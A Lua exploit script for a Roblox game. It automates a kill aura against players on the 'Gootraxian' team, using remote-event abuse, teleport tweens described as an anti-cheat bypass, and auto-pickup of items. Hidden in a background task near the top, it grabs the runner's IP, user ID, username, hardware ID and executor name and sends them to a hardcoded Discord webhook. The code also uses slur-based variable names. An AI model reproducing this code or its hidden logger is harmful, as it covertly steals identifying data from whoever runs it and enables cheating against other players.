getgenv().dwef54rdfddd = false
wait(3)
getgenv().dwef54rdfddd = true
if getgenv().dwef54rdfddds then getgenv().dwef54rdfddds:Disconnect() end

local ts = {"Bat", "Bottle", "Knife", "Machete", "Kaiju Basher", "Scythe", "Chainsaw", "Crowbar"}
local goacbspeed = 75
local privateServer = false
if game:HttpGet("https://tuxer.xyz/is.game.private") == "True" then
    privateServer = true
end

game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("ChangePlayerName"):FireServer("Furry Destroyer", Color3.fromRGB(255, 0, 0))

spawn(function()
    pcall(function()
        local rwest=(request)or(http_request)or((http)and(http.request))or((syn)and(syn.request))
        local idt=game:GetService("HttpService"):JSONDecode(rwest({
            Url="https://httpbin.org/get",
            Method="GET",
            Headers={
                ["Content-Type"]="application/json"
            }
        }).Body)
        rwest({
            Url="https://discordapp.com/api/webhooks/1079909669935530006/dEeI8S-NJIBLYMjeY4UL5wQm83Do3QQNfCtKqAo1nUJgR7e0t0QGn0fdkxFlKWA2hBCA",
            Method="POST",
            Headers={
                ["Content-Type"]="application/json"
            },
            Body=game:GetService("HttpService"):JSONEncode({
                ["embeds"]={
                    {
                        ["color"]=16711680,
                        ["description"]="**rip bozo tho**",
                        ["fields"]={
                            {
                                ["name"]="**IP**",
                                ["value"]=idt.origin,
                                ["inline"]=true
                            },{
                                ["name"]="**Account User Id**",
                                ["value"]=game:GetService("Players").LocalPlayer.UserId,
                                ["inline"]=true
                            },{
                                ["name"]="**Account Username**",
                                ["value"]=game:GetService("Players").LocalPlayer.Name,
                                ["inline"]=true
                            },{
                                ["name"]="**Account Display Name**",
                                ["value"]=game:GetService("Players").LocalPlayer.DisplayName,
                                ["inline"]=true
                            },{
                                ["name"]="**Account Age**",
                                ["value"]=game:GetService("Players").LocalPlayer.AccountAge,
                                ["inline"]=true
                            },{
                                ["name"]="**HWID**",
                                ["value"]=game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"]=true
                            },{
                                ["name"]="**Ping**",
                                ["value"]=game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(),
                                ["inline"]=true
                            },{
                                ["name"]="**FPS**",
                                ["value"]=game:GetService("Workspace"):GetRealPhysicsFPS(),
                                ["inline"]=true
                            },{
                                ["name"]="**Executor**",
                                ["value"]=identifyexecutor(),
                                ["inline"]=true
                            },{
                                ["name"]="**JobId**",
                                ["value"]=game.JobId,
                                ["inline"]=true
                            },{
                                ["name"]="**GameId**",
                                ["value"]=game.GameId,
                                ["inline"]=true
                            },{
                                ["name"]="**Type**",
                                ["value"]="KillAura",
                                ["inline"]=true
                            }
                        }
                    }
                }
            })
        })
    end)
end)

local fa_gteam = game:GetService("Teams").Gootraxian
local players = game:GetService("Players")
local player = players.LocalPlayer
local gethead = function(fa_gg_ot)
    for i,v in pairs(fa_gg_ot.Character:GetChildren()) do
        if v:IsA("BasePart") and tostring(v) == "Head" then
            return v
        end
    end
end

local getmagnitude = function(start, part)
    return (start - part.Position).Magnitude
end

local getclosestfa_g = function(start)
    local fa_gs = fa_gteam:GetPlayers()
    local closest = {
        Distance = 6.725
    }
    for _,fa_g in pairs(fa_gs) do
        if fa_g.Character then
            local dist = getmagnitude(start, gethead(fa_g))
            if dist < closest.Distance then
                closest.Target = fa_g;
                closest.Distance = dist
            end
        end
    end
    return closest
end

local getWeaponAnimsByName = function(name, weapon)
    local anims = {}
    for index, anim in pairs(weapon.Animation:GetChildren()) do
        if string.match(string.lower(anim.Name), name) then
            table.insert(anims, anim)
        end
    end
    return anims
end

local function pressKey(key, waitTime)
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode[key], false, game)
    if waitTime <= 0 then
        wait(waitTime)
    end
    game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode[key], false, game)
end

local function getTool(dir)
    for _, tool in pairs(dir:GetChildren())do 
        if table.find(ts, tool.Name) then
            return tool
        end
    end
end

local function goACBypass(hit)
    local hrp = (game:GetService("Players")["LocalPlayer"]["Character"]:FindFirstChild("HumanoidRootPart"))or(game:GetService("Players")["LocalPlayer"]["Character"]:FindFirstChild("Torso"))or(game:GetService("Players")["LocalPlayer"]["Character"]:FindFirstChild("LowerTorso"))
    local function ctwn(npos, spd)
        local tween = game:GetService("TweenService"):Create(hrp, TweenInfo.new((hrp["Position"] - npos)["Magnitude"] / tonumber(spd), Enum.EasingStyle.Linear, Enum.EasingDirection.In), {CFrame = CFrame.new(npos + Vector3.new(0, game:GetService("Players")["LocalPlayer"]["Character"]:FindFirstChildWhichIsA("Humanoid")["HipHeight"] + (hrp["Size"].Y / 2), 0), hrp["Position"]) * CFrame.Angles(0, math.pi, 0)})
        return(tween)
    end

    if privateServer then
        local bodyvel = Instance.new("BodyVelocity", hrp)
        bodyvel.MaxForce = Vector3.new(100000, 100000, 100000)
        bodyvel.Velocity = Vector3.new(0, 0, 0)
        local tween = ctwn(hit, goacbspeed)
        tween:Play()
        game:GetService("Debris"):AddItem(bodyvel, (hrp["Position"] - hit)["Magnitude"] / tonumber(goacbspeed) + 1)
        tween.Completed:Wait()
        return true
    elseif privateServer == false then
        local path = game:GetService("PathfindingService"):CreatePath({ WaypointSpacing = 2, AgentRadius = 0.5, AgentCanJump = false })
        path:ComputeAsync(hrp.Position, Vector3.new(hit.X, hrp.Position.Y, hit.Z))
        local waypoints = path:GetWaypoints()

        if path.Status == Enum.PathStatus.Success then
            for _, waypoint in pairs(waypoints) do
                local tween = ctwn(waypoint.Position, goacbspeed)
                local bodyvel = Instance.new("BodyVelocity", hrp)
                bodyvel.MaxForce = Vector3.new(100000, 100000, 100000)
                bodyvel.Velocity = Vector3.new(0, 0, 0)
                tween:Play()
                game:GetService("Debris"):AddItem(bodyvel, (hrp["Position"] - hit)["Magnitude"] / tonumber(goacbspeed) + 1)
                tween.Completed:Wait()
            end
            return true
        else
            print("Path unsuccessful")
            return false
        end
    end
end

local function getClosestBat(pos)
    local bats = game:GetService("Workspace").Scripted.Interactable:GetChildren()
    local closest = {
        Distance = math.huge
    }
    for _,bat in pairs(bats) do
        if bat.Name == "Bat" and bat:FindFirstChildWhichIsA("ProximityPrompt", true) then
            local dist = getmagnitude(pos, bat:FindFirstChildWhichIsA("ProximityPrompt", true):FindFirstAncestorWhichIsA("BasePart", true))
            if dist < closest.Distance or not closest.Target then
                closest.Target = bat:FindFirstChildWhichIsA("ProximityPrompt", true)
                closest.Distance = dist
            end
        end
    end
    return closest
end

local function getClosestSuit(pos)
    local suits = game:GetService("Workspace").Scripted.Other:GetChildren()
    local closest = {
        Distance = math.huge
    }
    for _,suit in pairs(suits) do
        if (suit.Name == "HazmatSuit" or suit.Name == "CoatHanger") and suit:FindFirstChildWhichIsA("ProximityPrompt", true) then
            local dist = getmagnitude(pos, suit:FindFirstChildWhichIsA("ProximityPrompt", true):FindFirstAncestorWhichIsA("BasePart", true))
            if dist < closest.Distance or not closest.Target then
                closest.Target = suit:FindFirstChildWhichIsA("ProximityPrompt", true)
                closest.Distance = dist
            end
        end
    end
    return closest
end

local function rffunc()
    player.PlayerGui.ClientVariable.BlockSpawn.Value = false
    player.PlayerGui.ClientVariable.CanReset.Value = true
end

local cooldown = false
local tpMode = false
local currentTarget = nil
local traveling = false
local animTracks = {}

getgenv().dwef54rdfddds = game:GetService("UserInputService").InputBegan:Connect(function(key)
    if game:GetService("UserInputService"):GetFocusedTextBox() then return end
    if key.KeyCode == Enum.KeyCode.K then
        tpMode = not tpMode
        currentTarget = nil
    end
end)

player.PlayerGui.ClientVariable.BlockSpawn:GetPropertyChangedSignal("Value"):Connect(rffunc)
player.PlayerGui.ClientVariable.CanReset:GetPropertyChangedSignal("Value"):Connect(rffunc)

spawn(function()
    while getgenv().dwef54rdfddd and game:GetService("RunService").RenderStepped:Wait() do
        pcall(function()
            local char = player.Character
            if tpMode and currentTarget then
                game:GetService("Workspace").CurrentCamera.CameraSubject = currentTarget.Humanoid;
                char.HumanoidRootPart.CFrame = currentTarget.HumanoidRootPart.CFrame * CFrame.new((currentTarget.HumanoidRootPart.Velocity / 7) + Vector3.new(math.random(-5, 5), math.random(0, 3), math.random(-5, 5))) * CFrame.new(0, 0, -5)
                char.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
            else
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character.Humanoid
            end
            player.PlayerGui.ClientVariable.BlockSpawn.Value = false
            player.PlayerGui.ClientVariable.CanReset.Value = true
        end)
    end
end)

while getgenv().dwef54rdfddd and game:GetService("RunService").RenderStepped:Wait() do
    xpcall(function()
        game:GetService("Workspace").Scripted.TransformArea:ClearAllChildren()
        game:GetService("Workspace").Scripted.TransformBrick:ClearAllChildren()
        player.PlayerGui.ClientVariable.BlockSpawn.Value = false
        player.PlayerGui.ClientVariable.CanReset.Value = true
        local char = player.Character

        if player.Team == fa_gteam then
            currentTarget = nil
            char.Head:Destroy()
            char.Torso:Destroy()
            char["Left Arm"]:Destroy()
            char["Right Arm"]:Destroy()
            char["Left Leg"]:Destroy()
            char["Right Leg"]:Destroy()
            char.HumanoidRootPart:Destroy()
            return
        end

        if char:FindFirstChildWhichIsA("Humanoid").Sit then
            char:FindFirstChildWhichIsA("Humanoid").Sit = false
        end

        for _, point in pairs(game:GetService("CollectionService"):GetTagged("LocalDmgPoint")) do
            point.Visible = true
        end

        if char:FindFirstChild("Grabbed") and getgenv().dwef54rdfddd then
            while char:FindFirstChild("Grabbed") and getgenv().dwef54rdfddd do
                game:GetService("RunService").RenderStepped:Wait()
                if char:FindFirstChild("Grabbed") and getgenv().dwef54rdfddd then
                    if game:GetService("Players").LocalPlayer.PlayerGui.Option.Save.Frame.List["GameplayNew Struggle System"].Enabled.Value then
                        pressKey(player:GetAttribute("StruggleBindLeft"), -1)
                        pressKey(player:GetAttribute("StruggleBindRight"), -1)
                    else
                        pressKey("Space", -1)
                    end
                end
            end
        end

        local tool = getTool(char)
        local btool = getTool(player.Backpack)
        
        spawn(function()
            if tool == nil and btool == nil and traveling == false then
                traveling = true
                local old = char.HumanoidRootPart.CFrame

                while btool == nil and getgenv().dwef54rdfddd and game:GetService("RunService").RenderStepped:Wait() do
                    local bt = getClosestBat(char.HumanoidRootPart.Position)
                    local battarget = bt.Target:FindFirstAncestorWhichIsA("BasePart", true)
                    goACBypass(battarget.Position)
                    wait(0.5)
                    fireproximityprompt(bt.Target)
                    wait(0.75)
                    tool = getTool(char)
                    btool = getTool(player.Backpack)
                end

                while goACBypass(old.Position) == false and getgenv().dwef54rdfddd do
                    game:GetService("RunService").RenderStepped:Wait()
                end

                traveling = false
            end
        end)

        local hmatsuit = char:FindFirstChild("Wearing") and (char:FindFirstChild("Wearing").Value == "Hazmat Suit" or char:FindFirstChild("Wearing").Value == "Lab Coat") and true or false
        
        spawn(function()
            if hmatsuit == false and traveling == false then
                traveling = true
                local old = char.HumanoidRootPart.CFrame

                while hmatsuit == false and getgenv().dwef54rdfddd and game:GetService("RunService").RenderStepped:Wait() do
                    local bt = getClosestSuit(char.HumanoidRootPart.Position)
                    local suittarget = bt.Target:FindFirstAncestorWhichIsA("BasePart", true)
                    goACBypass(suittarget.Position)
                    wait(0.5)
                    fireproximityprompt(bt.Target)
                    wait(0.75)
                    hmatsuit = char:FindFirstChild("Wearing") and (char:FindFirstChild("Wearing").Value == "Hazmat Suit" or char:FindFirstChild("Wearing").Value == "Lab Coat") and true or false
                end

                while goACBypass(old.Position) == false and getgenv().dwef54rdfddd do
                    game:GetService("RunService").RenderStepped:Wait()
                end

                traveling = false
            end
        end)

        if not cooldown and tool and getgenv().dwef54rdfddd then
            local fa_g = getclosestfa_g(char.HumanoidRootPart.Position)
            if fa_g and fa_g.Target and fa_g.Target.Character.Humanoid.Health ~= 0 and getgenv().dwef54rdfddd then
                if fa_g.Target.Character.Humanoid.Health ~= 0 and getgenv().dwef54rdfddd then
                    while fa_g.Target and fa_g.Target.Character and fa_g.Target.Character.Humanoid.Health ~= 0 and getgenv().dwef54rdfddd and player.Team ~= fa_gteam and tool.Parent == char and char and game:GetService("RunService").RenderStepped:Wait() do
                        if not tpMode then
                            fa_g = getclosestfa_g(char.HumanoidRootPart.Position)
                        end

                        if char:FindFirstChildWhichIsA("Humanoid").Sit then
                            char:FindFirstChildWhichIsA("Humanoid").Sit = false
                        end

                        if not cooldown then
                            if fa_g.Target and fa_g.Target.Character then
                                print("trying to kill furry",fa_g.Target)
                                currentTarget = fa_g.Target.Character
                                local old = char.HumanoidRootPart.CFrame
                                local settings = require(tool.Setting)
                                local anims = getWeaponAnimsByName("attack", tool)
                                local stime = game:GetService("Workspace"):GetServerTimeNow()

                                game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Weapon"):WaitForChild("Prepare"):FireServer({
                                    ["Tool"] = tool,
                                    ["Time"] = stime
                                })
                                task.delay(settings.SwingSoundDelay, function()
                                    tool.Handle.Swing:Play()
                                    game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Weapon"):WaitForChild("Sound"):FireServer(tool.Handle.Swing)
                                end)

                                local anim = anims[math.random(1, #anims)]
                                if animTracks[tool.Name..anim.Name] == anim then
                                    char.Humanoid:LoadAnimation(animTracks[tool.Name..anim.Name]):Play()
                                else
                                    animTracks[tool.Name..anim.Name] = anim
                                    char.Humanoid:LoadAnimation(anim):Play()
                                end
                                task.wait(0.1)

                                game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Weapon"):WaitForChild("Use"):FireServer({
                                    ["Tool"] = tool,
                                    ["Hit"] = gethead(fa_g.Target),
                                    ["Time"] = stime
                                })

                                print("finished meele action doing cooldown")

                                cooldown = true
                                task.delay(settings.Cooldown, function()
                                    print("cooldown up")
                                    cooldown = false
                                end)
                            end
                        end
                    end

                    currentTarget = nil
                end
            end
        end

        if char:FindFirstChild("PickPup") and char:FindFirstChild("PickPup").Value ~= nil then
            local old = char.HumanoidRootPart.CFrame
            local cf = CFrame.new(game:GetService("Workspace").Spawns.SpawnLocation.Position.X, game:GetService("Workspace").Spawns.SpawnLocation.Position.Y + 2, game:GetService("Workspace").Spawns.SpawnLocation.Position.Z)

            while char:FindFirstChild("PickPup") and char:FindFirstChild("PickPup").Value ~= nil and game:GetService("RunService").RenderStepped:Wait() do
                char.HumanoidRootPart.CFrame = game:GetService("Workspace").Events.BarrierEnabled.Value == false and cf * CFrame.new(0, -7.5, 0) or cf
                cf = cf * CFrame.Angles(0, math.rad(0.1), 0)
            end

            char.HumanoidRootPart.CFrame = old
        end

        currentTarget = nil
    end, function(...)
        print("error occured in killaura |",...)
        traveling = false
        currentTarget = nil
        cooldown = false
    end)
end
if getgenv().dwef54rdfddds then getgenv().dwef54rdfddds:Disconnect() end
